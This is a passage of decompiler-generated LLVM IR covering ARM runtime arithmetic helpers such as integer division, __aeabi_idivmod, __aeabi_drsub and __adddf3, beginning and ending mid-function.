  %v1_169a8 = phi i32 [ %v1_1699c, %bb93 ], [ %v1_1699c, %.thread8 ], [ %v6_1699c, %bb94 ]
  %v4_169a0 = udiv i32 %v1_169c0, 4
  %v6_169a0 = icmp ult i32 %v1_169a4, %v4_169a0
  br i1 %v6_169a0, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_169a4 = and i32 %v1_169c0, 2
  %v4_169a4 = icmp eq i32 %v3_169a4, 0
  %v6_169a4 = sub i32 %v1_169a4, %v4_169a0
  br i1 %v4_169a4, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_169a8 = udiv i32 %v1_169bc, 4
  %v6_169a8 = or i32 %v1_169a8, %v5_169a8
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_169b0 = phi i32 [ %v6_169a4, %bb95 ], [ %v1_169a4, %.thread9 ], [ %v6_169a4, %bb96 ]
  %v1_169b4 = phi i32 [ %v1_169a8, %bb95 ], [ %v1_169a8, %.thread9 ], [ %v6_169a8, %bb96 ]
  %v4_169ac = udiv i32 %v1_169c0, 8
  %v6_169ac = icmp ult i32 %v1_169b0, %v4_169ac
  br i1 %v6_169ac, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_169b0 = and i32 %v1_169c0, 4
  %v4_169b0 = icmp eq i32 %v3_169b0, 0
  %v6_169b0 = sub i32 %v1_169b0, %v4_169ac
  br i1 %v4_169b0, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_169b4 = udiv i32 %v1_169bc, 8
  %v6_169b4 = or i32 %v1_169b4, %v5_169b4
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_169cc = phi i32 [ %v1_169b4, %bb97 ], [ %v1_169b4, %.thread10 ], [ %v6_169b4, %bb98 ]
  %v0_169b8 = phi i32 [ %v6_169b0, %bb97 ], [ %v1_169b0, %.thread10 ], [ %v6_169b0, %bb98 ]
  %v2_169b8 = icmp eq i32 %v0_169b8, 0
  br i1 %v2_169b8, label %dec_label_pc_169c8, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_169bc, 16
  br i1 %tmp, label %dec_label_pc_169c8, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_169bc = udiv i32 %v1_169bc, 16
  %v4_169c0 = udiv i32 %v1_169c0, 16
  br label %dec_label_pc_16988

dec_label_pc_169c8:                               ; preds = %thread-pre-split12, %bb99
  %v1_169c8 = icmp slt i32 %v2_16920, 0
  br i1 %v1_169c8, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_169c8
  %v2_169cc = sub i32 0, %v1_169cc
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_169d4, %dec_label_pc_169c8, %bb100
  %v1_169d0 = phi i32 [ %v1_169cc, %dec_label_pc_169c8 ], [ %v2_169cc, %bb100 ], [ %arg1, %dec_label_pc_169d4 ], [ %v2_169d8, %bb101 ], [ %v1_169ec80, %bb103 ], [ %v2_169e8, %bb104 ]
  ret i32 %v1_169d0

dec_label_pc_169d4:                               ; preds = %thread-pre-split
  br i1 %v1_1691c, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_169d4
  %v2_169d8 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_169e0:                               ; preds = %bb86
  br i1 %v3_1693c, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_169e0
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_169e0, %bb102
  %v1_169ec80 = phi i32 [ %arg1, %dec_label_pc_169e0 ], [ 0, %bb102 ]
  br i1 %v9_1693c, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_169e4 = ashr i32 %v2_16920, 31
  %v2_169e8 = or i32 %v4_169e4, 1
  br label %.thread16

dec_label_pc_169f0:                               ; preds = %dec_label_pc_16944
  %v2_169f0 = icmp ugt i32 %v1_169f4, 65535
  br i1 %v2_169f0, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_169f0
  %v2_169f4 = and i32 %v1_169f4, 32768
  %v3_169f4 = icmp eq i32 %v2_169f4, 0
  %v4_169f4 = udiv i32 %v1_169f4, 65536
  br i1 %v3_169f4, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_169f0
  %v0_16a0070 = phi i32 [ %v1_169f4, %dec_label_pc_169f0 ], [ %v4_169f4, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_16a04 = phi i32 [ %v0_16a0070, %.thread19 ], [ %v4_169f4, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_16a00 = icmp ugt i32 %v1_16a04, 255
  br i1 %v2_16a00, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_16a04 = and i32 %v1_16a04, 128
  %v3_16a04 = icmp eq i32 %v2_16a04, 0
  %v4_16a04 = udiv i32 %v1_16a04, 256
  br i1 %v3_16a04, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_16a08 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_16a14 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_16a08, %bb108 ]
  %v1_16a10 = phi i32 [ %v1_16a04, %bb106 ], [ %v4_16a04, %bb107 ], [ %v4_16a04, %bb108 ]
  %v2_16a0c = icmp ugt i32 %v1_16a10, 15
  br i1 %v2_16a0c, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_16a10 = and i32 %v1_16a10, 8
  %v3_16a10 = icmp eq i32 %v2_16a10, 0
  %v4_16a10 = udiv i32 %v1_16a10, 16
  br i1 %v3_16a10, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_16a14 = add nsw i32 %v1_16a14, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_16a1c = phi i32 [ %v1_16a14, %.thread20 ], [ %v1_16a14, %bb109 ], [ %v2_16a14, %bb110 ]
  %v5_16a20 = phi i32 [ %v1_16a10, %.thread20 ], [ %v4_16a10, %bb109 ], [ %v4_16a10, %bb110 ]
  %v2_16a18 = icmp ugt i32 %v5_16a20, 3
  %v7_16a18 = icmp eq i32 %v5_16a20, 4
  %v2_16a1c = xor i1 %v7_16a18, true
  %v3_16a1c = and i1 %v2_16a18, %v2_16a1c
  br i1 %v3_16a1c, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_16a1c = add nsw i32 %v4_16a1c, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_16a20 = phi i32 [ %v4_16a1c, %.thread21 ], [ %v5_16a1c, %bb111 ]
  %v2_16a20 = xor i1 %v2_16a18, true
  %v3_16a20 = or i1 %v7_16a18, %v2_16a20
  br i1 %v3_16a20, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_16a20 = udiv i32 %v5_16a20, 2
  %v9_16a20 = add i32 %v4_16a20, %v8_16a20
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_16a28 = phi i32 [ %v4_16a20, %bb112 ], [ %v9_16a20, %bb113 ]
  %v1_16a24 = icmp slt i32 %v2_16920, 0
  %v6_16a28 = lshr i32 %v0_16a28, %v1_16a28
  %v2_16a2c = sub i32 0, %v6_16a28
  %v2_16a2c.v6_16a28 = select i1 %v1_16a24, i32 %v2_16a2c, i32 %v6_16a28
  ret i32 %v2_16a2c.v6_16a28

dec_label_pc_16a34:                               ; preds = %entry
  %v0_16a38 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_16a20, { 1, 0 }
  uselistorder i1 %v7_16a18, { 1, 0 }
  uselistorder i32 %v4_16a10, { 1, 0 }
  uselistorder i32 %v1_16a10, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16a04, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_16a04, { 1, 0, 2, 3 }
  uselistorder i32 %v4_169f4, { 1, 0 }
  uselistorder i32 %v0_169b8, { 1, 0 }
  uselistorder i32 %v4_169ac, { 1, 0 }
  uselistorder i32 %v1_169b4, { 1, 2, 0 }
  uselistorder i32 %v4_169a0, { 1, 0 }
  uselistorder i32 %v1_169a8, { 1, 2, 0 }
  uselistorder i32 %v4_16994, { 1, 0 }
  uselistorder i32 %v1_1699c, { 1, 2, 0 }
  uselistorder i32 %v1_169c0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_16990, { 1, 0 }
  uselistorder i32 %v1_169bc, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1697c, { 1, 0 }
  uselistorder i32 %v3_16978, { 1, 0 }
  uselistorder i32 %v1_16978, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_16974, { 1, 0 }
  uselistorder i32 %v1_1697c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16968, { 1, 0 }
  uselistorder i32 %v4_16964, { 2, 1, 0 }
  uselistorder i32 %v1_16968, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_16970.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1693c, { 1, 0 }
  uselistorder i32 %v1_169f4, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_16920, { 1, 0, 2 }
  uselistorder i32 %v0_1691c, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_169c8, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_16984, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16970thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_16a4c = sdiv i32 %arg1, %arg2
  ret i32 %v2_16a4c
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_16a64 = bitcast i64 %tmp to double
  %v9_16a64 = fadd double %v8_16a64, %arg1
  %v10_16a64 = fptrunc double %v9_16a64 to float
  %v11_16a64 = bitcast float %v10_16a64 to i32
  ret i32 %v11_16a64
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_16a68 = load i32, i32* @r0, align 4
  ret i32 %v2_16a68
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16a6c = load i32, i32* @r4, align 4
  store i32 %v3_16a6c, i32* %stack_var_-12, align 4
  %v6_16a6c = load i32, i32* @r5, align 4
  %v9_16a6c = load i32, i32* @lr, align 4
  %v0_16a70 = load i32, i32* %r1.global-to-local, align 4
  %v2_16a70 = mul i32 %v0_16a70, 2
  store i32 %v2_16a70, i32* %r4.global-to-local, align 4
  %v0_16a74 = load i32, i32* %r3.global-to-local, align 4
  %v2_16a74 = mul i32 %v0_16a74, 2
  store i32 %v2_16a74, i32* %r5.global-to-local, align 4
  %v4_16a78 = icmp eq i32 %v2_16a74, %v2_16a70
  %v1_16a7c = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_16a78, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_16a7c = load i32, i32* %r2.global-to-local, align 4
  %v5_16a7c = icmp eq i32 %v2_16a7c, %v1_16a7c
  br i1 %v5_16a7c, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_16a80 = or i32 %v1_16a7c, %v2_16a70
  %v5_16a80 = icmp eq i32 %v3_16a80, 0
  br i1 %v5_16a80, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_16a84 = load i32, i32* %r2.global-to-local, align 4
  %v3_16a84 = or i32 %v2_16a84, %v2_16a74
  %v5_16a84 = icmp eq i32 %v3_16a84, 0
  br i1 %v5_16a84, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_16a70.off = add i32 %v2_16a70, 4194303
  %tmp = icmp ult i32 %v2_16a70.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_16a74.off = add i32 %v2_16a74, 4194303
  %tmp17 = icmp ult i32 %v2_16a74.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_16a90 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_16a90, i32 ptrtoint (i32* @global_var_16cc8.587 to i32))
  %v0_16a94 = load i32, i32* %r4.global-to-local, align 4
  %v3_16a94 = udiv i32 %v0_16a94, 2097152
  store i32 %v3_16a94, i32* %r4.global-to-local, align 4
  %v1_16a98 = load i32, i32* %r5.global-to-local, align 4
  %v4_16a98 = udiv i32 %v1_16a98, 2097152
  %v5_16a98 = sub nsw i32 %v4_16a98, %v3_16a94
  %v5_16a9c = icmp ult i32 %v4_16a98, %v3_16a94
  br i1 %v5_16a9c, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_16a9c = sub nsw i32 0, %v5_16a98
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_16a9c, %bb13 ], [ %v5_16a98, %.thread3 ]
  %v0_16ac0 = phi i32 [ %v7_16a9c, %bb13 ], [ %v5_16a98, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_16aa0 = icmp ugt i32 %v4_16a98, %v3_16a94
  br i1 %v7_16aa0, label %dec_label_pc_16aa4, label %dec_label_pc_16ac0

dec_label_pc_16aa4:                               ; preds = %bb14
  %v2_16aa4 = add nsw i32 %v0_16ac0, %v3_16a94
  store i32 %v2_16aa4, i32* %r4.global-to-local, align 4
  %v0_16aa8 = load i32, i32* %r0.global-to-local, align 4
  %v1_16aa8 = load i32, i32* %r2.global-to-local, align 4
  %v0_16aac = load i32, i32* %r1.global-to-local, align 4
  %v1_16aac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_16aa8, i32* %r0.global-to-local, align 4
  store i32 %v1_16aac, i32* %r1.global-to-local, align 4
  store i32 %v0_16aa8, i32* %r2.global-to-local, align 4
  store i32 %v0_16aac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ac0

dec_label_pc_16ac0:                               ; preds = %bb14, %dec_label_pc_16aa4
  %tmp18 = icmp ugt i32 %v0_16ac0, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_16ac0
  %v6_16ac4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_16ac4, i32* %r4.global-to-local, align 4
  store i32 %v6_16a6c, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_16ac0, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_16a6c)
  %v0_16acc = load i32, i32* %r1.global-to-local, align 4
  %v3_16acc = icmp sgt i32 %v0_16acc, -1
  %v4_16ad8 = urem i32 %v0_16acc, 1048576
  %v5_16ad8 = or i32 %v4_16ad8, 1048576
  store i32 %v5_16ad8, i32* %r1.global-to-local, align 4
  br i1 %v3_16acc, label %dec_label_pc_16ae8, label %dec_label_pc_16ae0

dec_label_pc_16ae0:                               ; preds = %bb16
  %v0_16ae0 = load i32, i32* %r0.global-to-local, align 4
  %v1_16ae0 = sub i32 0, %v0_16ae0
  store i32 %v1_16ae0, i32* %r0.global-to-local, align 4
  %v2_16ae0 = icmp eq i32 %v0_16ae0, 0
  %v2_16ae4 = icmp eq i1 %v2_16ae0, false
  %v5_16ae4 = sext i1 %v2_16ae4 to i32
  %v6_16ae4 = sub nsw i32 %v5_16ae4, %v5_16ad8
  store i32 %v6_16ae4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16ae8

dec_label_pc_16ae8:                               ; preds = %bb16, %dec_label_pc_16ae0
  %v0_16ae8 = load i32, i32* %r3.global-to-local, align 4
  %v3_16ae8 = icmp sgt i32 %v0_16ae8, -1
  %v4_16af0 = urem i32 %v0_16ae8, 1048576
  %v5_16af0 = or i32 %v4_16af0, 1048576
  store i32 %v5_16af0, i32* %r3.global-to-local, align 4
  br i1 %v3_16ae8, label %dec_label_pc_16b00, label %dec_label_pc_16af8

dec_label_pc_16af8:                               ; preds = %dec_label_pc_16ae8
  %v0_16af8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16af8 = sub i32 0, %v0_16af8
  store i32 %v1_16af8, i32* %r2.global-to-local, align 4
  %v2_16af8 = icmp eq i32 %v0_16af8, 0
  %v2_16afc = icmp eq i1 %v2_16af8, false
  %v5_16afc = sext i1 %v2_16afc to i32
  %v6_16afc = sub nsw i32 %v5_16afc, %v5_16af0
  store i32 %v6_16afc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b00

dec_label_pc_16b00:                               ; preds = %dec_label_pc_16ae8, %dec_label_pc_16af8
  %v0_16b00 = load i32, i32* %r4.global-to-local, align 4
  %v1_16b00 = load i32, i32* %r5.global-to-local, align 4
  %v4_16b00 = icmp eq i32 %v1_16b00, %v0_16b00
  call void @__pseudo_cond_branch(i1 %v4_16b00, i32 ptrtoint (i32* @global_var_16cb0.588 to i32))
  %v1_16b04 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16b04

; uselistorder directives
  uselistorder i32 %v0_16ae8, { 1, 0 }
  uselistorder i32 %v0_16acc, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_16a98, { 2, 1, 0 }
  uselistorder i32 %v3_16a94, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16a7c, { 1, 0 }
  uselistorder i32 %v2_16a74, { 1, 3, 0, 2 }
  uselistorder i32 %v2_16a70, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_16b00, { 1, 0 }
  uselistorder label %dec_label_pc_16ae8, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_16ac0, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_16b08() local_unnamed_addr {
dec_label_pc_16b08:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_16b08 = load i32, i32* @r4, align 4
  %v1_16b08 = add i32 %v0_16b08, -1
  store i32 %v1_16b08, i32* @r4, align 4
  %v0_16b0c = load i32, i32* @r5, align 4
  %v1_16b0c = sub i32 32, %v0_16b0c
  store i32 %v1_16b0c, i32* @lr, align 4
  %v5_16b10 = icmp sgt i32 %v0_16b0c, 32
  br i1 %v5_16b10, label %dec_label_pc_16b2c, label %dec_label_pc_16b14

dec_label_pc_16b14:                               ; preds = %dec_label_pc_16b08
  %v0_16b14 = load i32, i32* @r2, align 4
  %v6_16b14 = shl i32 %v0_16b14, %v1_16b0c
  store i32 %v6_16b14, i32* %ip.global-to-local, align 4
  %v0_16b18 = load i32, i32* @r0, align 4
  %v3_16b18 = add i32 %v0_16b0c, -1
  %v4_16b18 = shl i32 1, %v3_16b18
  %v7_16b18 = lshr i32 %v0_16b14, %v0_16b0c
  %v8_16b18 = add i32 %v0_16b18, %v7_16b18
  %v9_16b18 = icmp ult i32 %v8_16b18, %v0_16b18
  %v0_16b1c = load i32, i32* @r1, align 4
  %v2_16b1c = zext i1 %v9_16b18 to i32
  %v3_16b1c = add i32 %v2_16b1c, %v0_16b1c
  %v1_16b20 = load i32, i32* @r3, align 4
  %v7_16b20 = shl i32 %v1_16b20, %v1_16b0c
  %v8_16b20 = add i32 %v7_16b20, %v8_16b18
  store i32 %v8_16b20, i32* %r0.global-to-local, align 4
  %v5_16b24 = and i32 %v1_16b20, %v4_16b18
  %v6_16b24 = icmp ne i32 %v5_16b24, 0
  %v7_16b24 = ashr i32 %v1_16b20, %v0_16b0c
  %v9_16b24 = add i32 %v3_16b1c, %v7_16b24
  %v10_16b24 = zext i1 %v6_16b24 to i32
  %v11_16b24 = add i32 %v10_16b24, %v9_16b24
  br label %dec_label_pc_16b48

dec_label_pc_16b2c:                               ; preds = %dec_label_pc_16b08
  %v1_16b2c = add i32 %v0_16b0c, -32
  %v1_16b30 = add i32 %v1_16b0c, 32
  store i32 %v1_16b30, i32* @lr, align 4
  %v0_16b38 = load i32, i32* @r3, align 4
  %v2_16b38 = add i32 %v1_16b0c, 31
  %v3_16b38 = lshr i32 -2147483648, %v2_16b38
  %v4_16b38 = and i32 %v0_16b38, %v3_16b38
  %v5_16b38 = icmp ne i32 %v4_16b38, 0
  %v6_16b38 = shl i32 %v0_16b38, %v1_16b30
  %v2_16b3c = or i32 %v6_16b38, 2
  %v2_16b3c.v6_16b38 = select i1 %v5_16b38, i32 %v2_16b3c, i32 %v6_16b38
  store i32 %v2_16b3c.v6_16b38, i32* %ip.global-to-local, align 4
  %v0_16b40 = load i32, i32* @r0, align 4
  %v7_16b40 = ashr i32 %v0_16b38, %v1_16b2c
  %v8_16b40 = add i32 %v0_16b40, %v7_16b40
  store i32 %v8_16b40, i32* %r0.global-to-local, align 4
  %v0_16b44 = load i32, i32* @r1, align 4
  %v2_16b44 = and i32 %v0_16b38, 1073741824
  %v3_16b44 = icmp ne i32 %v2_16b44, 0
  %v4_16b44 = ashr i32 %v0_16b38, 31
  %v6_16b44 = add i32 %v0_16b44, %v4_16b44
  %v7_16b44 = zext i1 %v3_16b44 to i32
  %v8_16b44 = add i32 %v6_16b44, %v7_16b44
  br label %dec_label_pc_16b48

dec_label_pc_16b48:                               ; preds = %dec_label_pc_16b14, %dec_label_pc_16b2c
  %storemerge = phi i32 [ %v11_16b24, %dec_label_pc_16b14 ], [ %v8_16b44, %dec_label_pc_16b2c ]
  %v0_16b48 = phi i32 [ %v11_16b24, %dec_label_pc_16b14 ], [ %v8_16b44, %dec_label_pc_16b2c ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_16b48 = and i32 %v0_16b48, -2147483648
  store i32 %v1_16b48, i32* @r5, align 4
  %v1_16b4c = icmp sgt i32 %v0_16b48, -1
  call void @__pseudo_cond_branch(i1 %v1_16b4c, i32 ptrtoint (i32* @global_var_16b5c.589 to i32))
  %v0_16b50 = load i32, i32* %ip.global-to-local, align 4
  %v1_16b50 = sub i32 0, %v0_16b50
  store i32 %v1_16b50, i32* %ip.global-to-local, align 4
  %v2_16b50 = icmp eq i32 %v0_16b50, 0
  %v0_16b54 = load i32, i32* %r0.global-to-local, align 4
  %v2_16b54 = icmp eq i1 %v2_16b50, false
  %v5_16b54 = sext i1 %v2_16b54 to i32
  %v6_16b54 = sub i32 %v5_16b54, %v0_16b54
  store i32 %v6_16b54, i32* %r0.global-to-local, align 4
  %v7_16b54 = zext i1 %v2_16b54 to i32
  %v8_16b54 = icmp ne i32 %v6_16b54, %v7_16b54
  %v9_16b54 = icmp ne i32 %v0_16b54, -1
  %v10_16b54 = or i1 %v9_16b54, %v8_16b54
  %v11_16b54 = icmp ne i32 %v0_16b54, 0
  %v12_16b54 = select i1 %v2_16b54, i1 %v10_16b54, i1 %v11_16b54
  %v0_16b58 = load i32, i32* %r1.global-to-local, align 4
  %v5_16b58 = sext i1 %v12_16b54 to i32
  %v6_16b58 = sub i32 %v5_16b58, %v0_16b58
  store i32 %v6_16b58, i32* @r1, align 4
  ret i32 %v6_16b54

; uselistorder directives
  uselistorder i1 %v2_16b54, { 1, 2, 0 }
  uselistorder i32 %v0_16b54, { 1, 2, 0 }
  uselistorder i32 %v8_16b44, { 1, 0 }
  uselistorder i32 %v0_16b38, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_16b24, { 1, 0 }
  uselistorder i32 %v1_16b20, { 1, 0, 2 }
  uselistorder i32 %v0_16b18, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_16b48, { 1, 0 }
}

define i32 @function_16b5c(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16b5c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_16b5c = load i32, i32* %r1.global-to-local, align 4
  %v3_16b60 = icmp ult i32 %v0_16b5c, 1048574
  br i1 %v3_16b60, label %dec_label_pc_16ba4, label %dec_label_pc_16b64

dec_label_pc_16b64:                               ; preds = %dec_label_pc_16b5c
  %v3_16b68 = icmp ult i32 %v0_16b5c, 2097150
  br i1 %v3_16b68, label %dec_label_pc_16b88, label %dec_label_pc_16b6c

dec_label_pc_16b6c:                               ; preds = %dec_label_pc_16b64
  %v1_16b6c = urem i32 %v0_16b5c, 2
  %v2_16b6c = icmp ne i32 %v1_16b6c, 0
  %v3_16b6c = udiv i32 %v0_16b5c, 2
  store i32 %v3_16b6c, i32* %r1.global-to-local, align 4
  %v0_16b70 = load i32, i32* %r0.global-to-local, align 4
  %v3_16b70 = zext i1 %v2_16b6c to i32
  %v6_16b70 = zext i32 %v0_16b70 to i64
  %v7_16b70 = sub i32 33, %v0_16b70
  %v8_16b70 = zext i32 %v7_16b70 to i64
  %v9_16b70 = shl i64 %v6_16b70, %v8_16b70
  %v10_16b70 = sub i32 32, %v0_16b70
  %v11_16b70 = shl i32 %v3_16b70, %v10_16b70
  %v12_16b70 = zext i32 %v11_16b70 to i64
  %v14_16b70 = or i64 %v12_16b70, %v9_16b70
  %v15_16b70 = trunc i64 %v14_16b70 to i32
  %v16_16b70 = add i32 %v0_16b70, -1
  %v17_16b70 = shl i32 1, %v16_16b70
  %v18_16b70 = and i32 %v17_16b70, %v0_16b70
  %v19_16b70 = icmp ne i32 %v18_16b70, 0
  store i32 %v15_16b70, i32* %r0.global-to-local, align 4
  %v0_16b74 = load i32, i32* @ip, align 4
  %v3_16b74 = zext i1 %v19_16b70 to i32
  %v6_16b74 = zext i32 %v0_16b74 to i64
  %v7_16b74 = sub i32 33, %v0_16b74
  %v8_16b74 = zext i32 %v7_16b74 to i64
  %v9_16b74 = shl i64 %v6_16b74, %v8_16b74
  %v10_16b74 = sub i32 32, %v0_16b74
  %v11_16b74 = shl i32 %v3_16b74, %v10_16b74
  %v12_16b74 = zext i32 %v11_16b74 to i64
  %v14_16b74 = or i64 %v12_16b74, %v9_16b74
  %v15_16b74 = trunc i64 %v14_16b74 to i32
  store i32 %v15_16b74, i32* @ip, align 4
  %v0_16b78 = load i32, i32* @r4, align 4
  %v1_16b78 = add i32 %v0_16b78, 1
  store i32 %v1_16b78, i32* @r4, align 4
  %v3_16b7c = mul i32 %v1_16b78, 2097152
  %v2_16b80 = icmp ugt i32 %v3_16b7c, -4194305
  call void @__pseudo_cond_branch(i1 %v2_16b80, i32 ptrtoint (i32* @global_var_16d38.590 to i32))
  br label %dec_label_pc_16b88

dec_label_pc_16b88:                               ; preds = %dec_label_pc_16ba4, %dec_label_pc_16b64, %dec_label_pc_16b6c
  %v0_16b88 = load i32, i32* @ip, align 4
  %v2_16b88 = icmp slt i32 %v0_16b88, 0
  %v6_16b88 = icmp eq i32 %v0_16b88, -2147483648
  %v1_16b8c = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_16b88, label %bb, label %dec_label_pc_16b88._crit_edge

bb:                                               ; preds = %dec_label_pc_16b88
